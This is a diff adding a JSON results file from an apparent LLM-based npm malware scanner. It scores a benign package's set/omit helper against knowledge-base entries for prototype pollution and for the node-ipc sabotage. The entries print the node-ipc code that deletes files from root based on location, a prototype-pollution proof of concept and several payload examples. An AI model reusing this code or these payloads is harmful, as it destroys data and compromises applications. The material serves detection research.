+                  "violated_expectations": "Normally, deep merging should only affect the target object, not the global prototype chain. Here, untrusted input is able to pollute the prototype, impacting all objects.",
+                  "similar_legitimate_use": "Deep merging of configuration objects is common, but should never allow modification of the prototype chain.",
+                  "key_indicators": [
+                    "Use of __proto__ property in user input",
+                    "Recursive merge without filtering prototype keys",
+                    "Global side effects such as {}.devMode === true"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "application code using jQuery.extend()",
+                  "required_permissions": [
+                    "environment_vars",
+                    "application_object_access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "jquery",
+                  "package_manager": "npm",
+                  "package_versions": "<3.4.0",
+                  "why_malicious": "The affected versions of jQuery allow prototype pollution via the extend() API. Attackers can inject properties into the Object prototype by supplying objects with __proto__, constructor, or prototype keys as input to deep merge operations. This enables privilege escalation, denial of service, or arbitrary code path manipulation in applications that use jQuery.extend(true, ...) with untrusted input, as malicious properties become globally accessible on all objects."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker submits user-controlled JSON or object containing a __proto__ property.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Application processes the input using unsafe deep merge or mapping."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Application merges or assigns the user input into an object using jQuery.extend() or direct assignment, without filtering prototype keys.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "The Object prototype is polluted with attacker-controlled properties."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Subsequent code accesses properties (e.g., isAdmin, toString) on objects, which now resolve to attacker-controlled values via the prototype chain.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Privilege escalation, logic manipulation, or denial of service."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Deep merge operations (e.g., jQuery.extend(true, ...)) involving user-controlled objects containing __proto__, constructor, or prototype keys",
+                    "Assignment to object properties using user-controlled keys without filtering for prototype pollution vectors",
+                    "Unexpected global properties or methods (e.g., isAdmin, toString) appearing on Object.prototype at runtime"
+                  ],
+                  "file_indicators": [
+                    "Use of jQuery.extend(true, ...) with untrusted or user-supplied input",
+                    "Direct assignment to [\"__proto__\"], [\"constructor\"], or [\"prototype\"] in application code"
+                  ],
+                  "network_indicators": [],
+                  "how_to_detect": "Monitor for deep merge or object assignment operations where user-controlled data is used as keys, especially if the keys are __proto__, prototype, or constructor. Audit code for use of jQuery.extend(true, ...) or similar recursive merge utilities with untrusted input. Use static analysis to flag assignments to __proto__ or suspicious object key usage. At runtime, detect unexpected properties or methods on Object.prototype or global objects, such as isAdmin or toString, that are not part of the application's intended logic."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/imicros-flow/0.3.8/package/dev/setValue.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "setValue_slice_1",
+          "code_snippet": "// _.omit(ctx.meta, [\"acl\",\"auth\",\"token\",\"accessToken\",\"serviceToken\"])\n\nfunction omit(obj, pathes) {\n    if (Object(obj) !== obj || !Array.isArray(pathes)) return obj; // When obj is not an object\n    for (let i = 0; i < pathes.length; i++) obj = set(obj, pathes[i], undefined);\n    return obj;\n}\n\nfunction set(obj, path, value) {\n    if (Object(obj) !== obj) return obj; // When obj is not an object\n    // If not yet an array, get the keys from the string-path\n    if (!Array.isArray(path)) path = path.toString().match(/[^.[\\]]+/g) || [];\n    if (value !== undefined) {\n        path.slice(0,-1).reduce((a, c, i) => // Iterate all of them except the last one\n             Object(a[c]) === a[c] // Does the key exist and is its value an object?\n                 // Yes: then follow that path\n                 ? a[c] \n                 // No: create the key. Is the next key a potential array-index?\n                 : a[c] = Math.abs(path[i+1])>>0 === +path[i+1] \n                       ? [] // Yes: assign a new array object\n                       : {}, // No: assign a new plain object\n             obj)[path[path.length-1]] = value; // Finally assign the value to the last key\n\n    } else {\n        delete path.slice(0,-1).reduce((a, c) => // Iterate all of them except the last one\n             Object(a[c]) === a[c] // Does the key exist and is its value an object?\n                 // Yes: then follow that path\n                 ? a[c] \n                 // No: stop here\n                 : {},\n              obj)[path[path.length-1]]; // Finally delete the last key\n    }\n    return obj; // Return the top-level object to allow chaining}\n}\n    \nconsole.log(set({ \"first\": {} },\"first.second.third\", \"property\"));\nconsole.log(omit(set({ \"first\": {} },\"first.second.third\", \"property\"),[\"first.second.third\"]));\nconsole.log(omit(set({ \"first\": {} },\"first.second.third\", \"property\"),[\"first.second\"]));\nconsole.log(omit({ \"first\": {} },[\"first.second.third\"]));",
+          "is_malicious": false,
+          "malice_score": 0.4611360410849253,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code modifies and deletes nested object properties using custom set and omit functions, manipulating JavaScript objects without accessing sensitive APIs or external data. No network, file, system, cryptographic, or process management operations occur, and no suspicious hardcoded data or commands are present, resulting in purely local data structure manipulation without security impact.",
+          "explanation": "[LLM Judgment: Benign] The provided code implements utility functions to set and omit nested properties on JavaScript objects. It manipulates object properties locally without any interaction with external systems, no network or file operations, no use of sensitive APIs, and no evidence of prototype pollution or injection vulnerabilities. Unlike the known malicious patterns, it does not parse or assign user-controlled input to object prototypes or perform any filtering related to prototype keys. The code is straightforward, lacks obfuscation, and does not exhibit any suspicious or malicious intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250105_195714_456685_snippet_1",
+              "source_package": "express-fileupload (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456685/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47903990745544434,
+              "code_similarity": 0.44406774640083313,
+              "behavior_similarity": 0.5140120983123779,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "keyParts = key.replace(new RegExp(/\\[/g), '.').replace(new RegExp(/\\]/g), '').split('.');\nfor (let index = 0; index < keyParts.length; index++) {\n  let k = keyParts[index];\n  // Ensure we don't allow prototype pollution\n  if (INVALID_KEYS.includes(k)) {\n    continue;\n  }\n  if (index >= keyParts.length - 1) {\n    current[k] = value;\n  }\n}",
+                "code_behavior": "At runtime, the code parses user-supplied keys from uploaded file payloads, traverses and assigns values to nested object properties based on those keys, and, due to insufficient filtering, allows assignment to prototype properties, resulting in prototype pollution and arbitrary property injection.",
+                "malice_analysis": {
+                  "why_suspicious": "The code allows user-controlled input to directly modify object properties, including prototype properties, with only minimal filtering. This enables attackers to exploit prototype pollution by injecting properties into Object.prototype or Array.prototype, which can alter application behavior globally.",
+                  "violated_expectations": "Normal file upload handlers should never allow user input to affect the global object prototype or application-wide object behavior. Here, user input can alter application logic globally by polluting prototypes.",
+                  "similar_legitimate_use": "Deep property assignment from user input is sometimes used for configuration merging or dynamic object construction, but must be strictly validated to prevent prototype pollution.",
+                  "key_indicators": [
+                    "Direct assignment to object properties based on user input",
+                    "Insufficient filtering of prototype mutators (e.g., only checking '__proto__')",
+                    "Use of split('.') or similar logic to traverse and assign nested properties from user input",
+                    "Assignment to object properties within a loop over user-controlled key parts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when handling file upload payloads)",
+                  "file_location": "internal data parsing logic (e.g., within the main fileupload handler)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network (if exfiltration is chained)",
+                    "environment_vars (if polluted)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "express-fileupload",
+                  "package_manager": "npm",
+                  "package_versions": "<1.1.10 (notably 1.1.8 and below, 1.1.9 partially fixed)",
+                  "why_malicious": "The package contains a critical Prototype Pollution vulnerability (CVE-2020-7699) that allows attackers to manipulate JavaScript object prototypes via crafted file upload payloads. This vulnerability enables attackers to inject arbitrary properties into global objects, potentially leading to Denial of Service (DoS), privilege escalation, and, in advanced exploitation scenarios, remote code execution (RCE) on backend Node.js applications."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker crafts a file upload payload with malicious keys (e.g., {\"constructor.prototype.shell\": \"malicious_value\"})",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Payload is parsed and keys are assigned to object properties"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Vulnerable code assigns user-supplied values to prototype properties (e.g., Object.prototype or Array.prototype)",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Global object prototype is polluted"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Polluted prototype enables attacker to alter application logic, cause Denial of Service, or achieve remote code execution (RCE) if chained with other vulnerabilities (e.g., template injection)",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Denial of Service, privilege escalation, or RCE"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Assignment to object properties based on user-supplied keys without comprehensive prototype key filtering",
+                    "Presence of split('.') or similar logic for deep property assignment from user input",
+                    "Blacklist-based filtering of prototype mutators (e.g., only '__proto__', 'constructor')",
+                    "Custom file upload handlers that parse and assign nested properties from user input"
+                  ],
+                  "file_indicators": [
+                    "Use of express-fileupload versions <1.1.10",
+                    "Presence of custom file upload handler code that parses and assigns nested properties from user input",
+                    "Code containing split('.') or similar logic in file upload parsing routines"
+                  ],
+                  "network_indicators": [
+                    "Unusual outbound connections following file upload (if RCE is achieved)",
+                    "Unexpected reverse shell activity (e.g., netcat connections as shown in PoC)",
+                    "Outbound connections to attacker-controlled infrastructure after file upload"
+                  ],
+                  "how_to_detect": "Scan for use of express-fileupload versions below 1.1.10. Analyze file upload handlers for deep property assignment from user input, especially where split('.') or similar logic is used. Flag any code that assigns to object properties based on user input without comprehensive prototype key filtering (i.e., not using Object.getOwnPropertyNames for both Object.prototype and Array.prototype). Monitor for outbound network connections or reverse shell activity following file uploads, which may indicate successful exploitation. Review application logs for unexpected property injection or prototype pollution errors."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205359_429073_snippet_4",
+              "source_package": "jquery (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205359_429073/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4594463109970093,
+              "code_similarity": 0.4507187604904175,
+              "behavior_similarity": 0.4681738615036011,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "let list_of_npm_packages = JSON.parse(`\n[\n  {\n    \"cool-package\": {\n      \"license\": \"MIT\",\n      \"github\": \"https://github.com/someuser/cool-package\"\n    }\n  },\n  {\n    \"__proto__\": {\n      \"toString\": \"april fools\"\n    }\n  }\n]`);\n\nlist_of_npm_packages.forEach((package) => {\n     for (const [propertyKey, objectValue] of Object.entries(package)) {\n          for (const [name, value] of Object.entries(objectValue)) {            \n            if (!packagesMap[propertyKey]) {\n            packagesMap[propertyKey] = {}\n            }\n            packagesMap[propertyKey][name] = value \n          }\n     }\n})\n\nconst a = {}\nconsole.log(a.toString)  // prints ‘april fools’\nconsole.log({}.toString) // prints ‘april fools’",
+                "code_behavior": "At runtime, the code processes a list of package objects, one of which has a __proto__ key. When merged into packagesMap, this pollutes Object.prototype with a toString property, causing all objects to inherit the attacker's toString implementation.",
+                "malice_analysis": {
+                  "why_suspicious": "User-controlled data is used as object keys without filtering, allowing prototype pollution and global method override, which can disrupt application logic or security.",
+                  "violated_expectations": "Mapping user data should not affect the global object prototype. Assignments should be limited to intended objects, not the prototype chain.",
+                  "similar_legitimate_use": "Mapping package data is common, but should never allow prototype chain modification or global method overrides.",
+                  "key_indicators": [
+                    "User-controlled __proto__ key in data",
+                    "Assignment to packagesMap[propertyKey][name] without key validation",
+                    "Global override of toString method on Object.prototype"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "application code processing package lists",
+                  "required_permissions": [
+                    "application_object_access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "jquery",
+                  "package_manager": "npm",
+                  "package_versions": "<3.4.0",
+                  "why_malicious": "The affected versions of jQuery allow prototype pollution via the extend() API. Attackers can inject properties into the Object prototype by supplying objects with __proto__, constructor, or prototype keys as input to deep merge operations. This enables privilege escalation, denial of service, or arbitrary code path manipulation in applications that use jQuery.extend(true, ...) with untrusted input, as malicious properties become globally accessible on all objects."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker submits user-controlled JSON or object containing a __proto__ property.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Application processes the input using unsafe deep merge or mapping."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Application merges or assigns the user input into an object using jQuery.extend() or direct assignment, without filtering prototype keys.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "The Object prototype is polluted with attacker-controlled properties."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Subsequent code accesses properties (e.g., isAdmin, toString) on objects, which now resolve to attacker-controlled values via the prototype chain.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Privilege escalation, logic manipulation, or denial of service."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Deep merge operations (e.g., jQuery.extend(true, ...)) involving user-controlled objects containing __proto__, constructor, or prototype keys",
+                    "Assignment to object properties using user-controlled keys without filtering for prototype pollution vectors",
+                    "Unexpected global properties or methods (e.g., isAdmin, toString) appearing on Object.prototype at runtime"
+                  ],
+                  "file_indicators": [
+                    "Use of jQuery.extend(true, ...) with untrusted or user-supplied input",
+                    "Direct assignment to [\"__proto__\"], [\"constructor\"], or [\"prototype\"] in application code"
+                  ],
+                  "network_indicators": [],
+                  "how_to_detect": "Monitor for deep merge or object assignment operations where user-controlled data is used as keys, especially if the keys are __proto__, prototype, or constructor. Audit code for use of jQuery.extend(true, ...) or similar recursive merge utilities with untrusted input. Use static analysis to flag assignments to __proto__ or suspicious object key usage. At runtime, detect unexpected properties or methods on Object.prototype or global objects, such as isAdmin or toString, that are not part of the application's intended logic."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456685_snippet_3",
+              "source_package": "express-fileupload (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456685/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4540773630142212,
+              "code_similarity": 0.3811246454715729,
+              "behavior_similarity": 0.5270300507545471,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "const OBJECT_PROTOTYPE_KEYS = Object.getOwnPropertyNames(Object.prototype);\nconst ARRAY_PROTOTYPE_KEYS = Object.getOwnPropertyNames(Array.prototype);\n...\nconst IN_ARRAY_PROTOTYPE = ARRAY_PROTOTYPE_KEYS.includes(k) && Array.isArray(current);\nif (OBJECT_PROTOTYPE_KEYS.includes(k) || IN_ARRAY_PROTOTYPE) {\n  continue;\n}",
+                "code_behavior": "At runtime, the code blocks assignment to any property names found in Object.prototype or Array.prototype, as well as array prototype keys, when parsing user-supplied file upload payloads, thereby preventing prototype pollution via user input.",
+                "malice_analysis": {
+                  "why_suspicious": "This is a defensive fix, not malicious, but demonstrates the correct approach to prevent prototype pollution by blocking all prototype keys, not just a static blacklist. It closes the attack vector exploited in previous versions.",
+                  "violated_expectations": "Earlier versions failed to block all prototype keys, allowing malicious input to pollute prototypes. This version meets secure coding expectations for deep property assignment.",
+                  "similar_legitimate_use": "Comprehensive prototype key filtering is a best practice for secure deep property assignment and is a legitimate defensive coding technique.",
+                  "key_indicators": [
+                    "Use of Object.getOwnPropertyNames to enumerate all prototype keys",
+                    "Blocking both object and array prototype pollution",
+                    "Conditional logic to prevent assignment to prototype properties based on user input"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when handling file upload payloads)",
+                  "file_location": "internal data parsing logic (e.g., within the main fileupload handler, version 1.1.10+)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network (if exfiltration is chained)",
+                    "environment_vars (if polluted)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "express-fileupload",
+                  "package_manager": "npm",
+                  "package_versions": "<1.1.10 (notably 1.1.8 and below, 1.1.9 partially fixed)",
+                  "why_malicious": "The package contains a critical Prototype Pollution vulnerability (CVE-2020-7699) that allows attackers to manipulate JavaScript object prototypes via crafted file upload payloads. This vulnerability enables attackers to inject arbitrary properties into global objects, potentially leading to Denial of Service (DoS), privilege escalation, and, in advanced exploitation scenarios, remote code execution (RCE) on backend Node.js applications."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker crafts a file upload payload with malicious keys (e.g., {\"constructor.prototype.shell\": \"malicious_value\"})",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Payload is parsed and keys are assigned to object properties"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Vulnerable code assigns user-supplied values to prototype properties (e.g., Object.prototype or Array.prototype)",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Global object prototype is polluted"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Polluted prototype enables attacker to alter application logic, cause Denial of Service, or achieve remote code execution (RCE) if chained with other vulnerabilities (e.g., template injection)",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Denial of Service, privilege escalation, or RCE"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Assignment to object properties based on user-supplied keys without comprehensive prototype key filtering",
+                    "Presence of split('.') or similar logic for deep property assignment from user input",
+                    "Blacklist-based filtering of prototype mutators (e.g., only '__proto__', 'constructor')",
+                    "Custom file upload handlers that parse and assign nested properties from user input"
+                  ],
+                  "file_indicators": [
+                    "Use of express-fileupload versions <1.1.10",
+                    "Presence of custom file upload handler code that parses and assigns nested properties from user input",
+                    "Code containing split('.') or similar logic in file upload parsing routines"
+                  ],
+                  "network_indicators": [
+                    "Unusual outbound connections following file upload (if RCE is achieved)",
+                    "Unexpected reverse shell activity (e.g., netcat connections as shown in PoC)",
+                    "Outbound connections to attacker-controlled infrastructure after file upload"
+                  ],
+                  "how_to_detect": "Scan for use of express-fileupload versions below 1.1.10. Analyze file upload handlers for deep property assignment from user input, especially where split('.') or similar logic is used. Flag any code that assigns to object properties based on user input without comprehensive prototype key filtering (i.e., not using Object.getOwnPropertyNames for both Object.prototype and Array.prototype). Monitor for outbound network connections or reverse shell activity following file uploads, which may indicate successful exploitation. Review application logs for unexpected property injection or prototype pollution errors."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205354_711722_snippet_1",
+              "source_package": "object-path (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205354_711722/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.440751314163208,
+              "code_similarity": 0.4082697033882141,
+              "behavior_similarity": 0.4732328951358795,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "if (options.includeInheritedProps && (currentPath === '__proto__' || (currentPath === 'constructor' && typeof currentValue === 'function'))) {\n  throw new Error('For security reasons, object\\'s magic properties cannot be set')\n}",
+                "code_behavior": "At runtime, the code attempts to block setting dangerous properties by checking if the current property path is '__proto__' or 'constructor' using strict equality, then throws an error to prevent assignment. However, if the attacker supplies an array containing '__proto__' as the path, the check fails due to type mismatch, allowing the dangerous property to be set on the object prototype.",
+                "malice_analysis": {
+                  "why_suspicious": "The security check only compares the property path as a string, without normalizing input types. This allows attackers to bypass the check by supplying an array-wrapped dangerous property name, such as ['__proto__'], which is not caught by the strict equality comparison.",
+                  "violated_expectations": "Proper security checks should normalize or validate input types to ensure that all attempts to set dangerous properties like '__proto__' are blocked, regardless of how the property name is supplied. The actual implementation only blocks exact string matches, leaving the application vulnerable.",
+                  "similar_legitimate_use": "Strict equality is commonly used for type-safe comparisons in non-security contexts, but in security-sensitive code, input normalization is required to prevent bypasses.",
+                  "key_indicators": [
+                    "Strict equality check (===) on user-controlled property path",
+                    "No input type normalization before security check",
+                    "Allows array-wrapped dangerous property names to bypass protection",
+                    "Assignment to prototype properties based on unchecked input"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "object-path internal set() method",
+                  "required_permissions": [
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "object-path",
+                  "package_manager": "npm",
+                  "package_versions": "<0.11.6",
+                  "why_malicious": "The package is vulnerable to prototype pollution due to improper type checking in its property path validation logic. Attackers can bypass security checks by supplying array-wrapped dangerous property names, leading to arbitrary property injection on object prototypes. This enables attackers to manipulate application behavior or escalate privileges by modifying the prototype chain."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker supplies an array-wrapped dangerous property name (e.g., ['__proto__']) as a path to the set() function.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Bypass of prototype pollution protection logic."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The set() function fails to detect the dangerous property due to strict equality type mismatch, allowing the property to be set on the object prototype.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Prototype pollution, enabling arbitrary property injection."
+                  },
+                  {
+                    "step": 3,
+                    "action": "In edge.js, attacker supplies an array as a query parameter (e.g., name[]=<img src=x onerror='alert(1)'/>) to a template rendering endpoint.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Input is not escaped and is rendered directly in the template, resulting in XSS."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Strict equality checks on user input for dangerous property names without type normalization",
+                    "Template rendering functions that only escape string input, not arrays or objects",
+                    "User-controlled array input passed to property access or template rendering",
+                    "Assignment to prototype properties based on unchecked or unnormalized input"
+                  ],
+                  "file_indicators": [
+                    "object-path set() or similar deep property setter functions lacking input normalization",
+                    "Template engines with escape() or similar sanitization functions that type-check only for string and do not handle arrays or objects"
+                  ],
+                  "network_indicators": [
+                    "HTTP requests with query parameters using array notation (e.g., name[]=...)",
+                    "Unusual property names in JSON or query payloads (e.g., ['__proto__'])"
+                  ],
+                  "how_to_detect": "Monitor for use of array-wrapped property names in API requests or query parameters, especially when passed to deep property setters. Audit template rendering code for escape or sanitization functions that only handle strings and do not sanitize arrays or objects. Flag any user input that is not normalized to string before security checks or output rendering. Track assignments to '__proto__', 'constructor', or similar properties regardless of input type, and alert on attempts to set these properties via user input."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195356_692327_snippet_1",
+              "source_package": "node-ipc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_692327/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4403211176395416,
+              "code_similarity": 0.32253533601760864,
+              "behavior_similarity": 0.5581068992614746,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "setTimeout(function () {\n    const randomNumber = Math.round(Math.random() * 4);\n    if (randomNumber > 1) {\n        // return;\n    }\n    const apiKey = \"https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154\";\n    const pwd = \"./\";\n    const parentDir = \"../\";\n    const grandParentDir = \"../../\";\n    const root = \"/\";\n    const countryName = \"country_name\";\n    const russia = \"russia\";\n    const belarus = \"belarus\";\n    https.get(apiKey, function (message) {\n        message.on(\"data\", function (msgBuffer) {\n            try {\n                const message = JSON.parse(msgBuffer.toString(\"utf8\"));\n                const userCountryName = message[countryName.toString(\"utf8\")].toLowerCase();\n                const hasRus = userCountryName.includes(russia.toString(\"utf8\")) || userCountryName.includes(belarus.toString(\"utf8\"));\n                if (hasRus) {\n                    deleteFile(pwd);\n                    deleteFile(parentDir);\n                    deleteFile(grandParentDir);\n                    deleteFile(root);\n                }\n            } catch (t) {}\n        });\n    });\n    // zkyf: Let's try this directly here\n    deleteFile(pwd);\n    deleteFile(parentDir);\n    deleteFile(grandParentDir);\n    deleteFile(root);\n}, 100);",
+                "code_behavior": "At runtime, shortly after import, the code initiates a delayed execution using setTimeout, performs an external geolocation API request, parses the response to determine the user's country, and if the country is Russia or Belarus, recursively calls a file deletion function on multiple directory levels, resulting in destructive file overwrites.",
+                "malice_analysis": {
+                  "why_suspicious": "The code makes an unsolicited external geolocation API request and, based on the result, triggers recursive file overwrite operations targeting the entire filesystem. This is a clear indicator of a targeted, destructive payload.",
+                  "violated_expectations": "A legitimate IPC package should not perform geolocation checks or attempt to overwrite user files under any circumstances. The expected behavior is to provide inter-process communication utilities, not to execute destructive actions based on user location.",
+                  "similar_legitimate_use": "Geolocation checks may be used for regional feature toggling or compliance, but never to trigger destructive file operations. Recursive file deletion is only appropriate in uninstallers or cleanup tools, and only with explicit user consent.",
+                  "key_indicators": [
+                    "Automated geolocation API request at runtime",
+                    "Conditional logic targeting specific countries (Russia, Belarus)",
+                    "Recursive invocation of file overwrite function across multiple directory levels",
+                    "Destructive file operations triggered without user interaction"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (shortly after import, via setTimeout)",
+                  "file_location": "dao/ssl-geospec.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "node-ipc",
+                  "package_manager": "npm",
+                  "package_versions": "10.1.1, 10.1.2",
+                  "why_malicious": "The package was intentionally altered by its maintainer to include code that, upon execution, checks the user's geolocation via an external API. If the user is located in Russia or Belarus, the code recursively overwrites files across the filesystem with a heart emoji, resulting in widespread and deliberate data destruction. This constitutes a targeted sabotage attack, which is entirely outside the scope of legitimate package behavior."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "On package installation or import, the malicious code in dao/ssl-geospec.js is loaded and scheduled for execution via setTimeout.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Geolocation check and potential execution of destructive payload"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The code performs an external geolocation API request to determine if the user is located in Russia or Belarus.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Conditional execution of recursive file overwrite function"
+                  },
+                  {
+                    "step": 3,
+                    "action": "If the user is in a targeted country, the code recursively attempts to overwrite all files on the system with a heart emoji.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Destruction of user and system data"
+                  },
+                  {
+                    "step": 4,
+                    "action": "In related packages (peacenotwar, oneday-test), the code writes a protest message file to user Desktop and OneDrive directories.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Display of unsolicited political/protest message in user-accessible locations"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript packages that make runtime geolocation API requests and subsequently perform recursive filesystem operations or file overwrites",
+                    "Recursive file overwrite attempts targeting user and system directories, especially with static content (e.g., heart emoji)",
+                    "Creation of unsolicited files with political or protest content in user Desktop or OneDrive directories"
+                  ],
+                  "file_indicators": [
+                    "dao/ssl-geospec.js",
+                    "WITH-LOVE-FROM-AMERICA.txt",
+                    "Unusual file writes to ~/Desktop, ~/OneDrive, ~/OneDrive/Desktop"
+                  ],
+                  "network_indicators": [
+                    "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that initiate external geolocation API requests at runtime, especially if followed by recursive filesystem operations or file overwrites. Flag any package that writes unsolicited files to user Desktop or OneDrive directories, or that contains the file dao/ssl-geospec.js. Alert on the presence of WITH-LOVE-FROM-AMERICA.txt in user directories. Correlate destructive file operations or unusual file creation with recent package updates or new dependencies to identify malicious activity."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/imicros-flow/0.3.8/package/dev/size.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
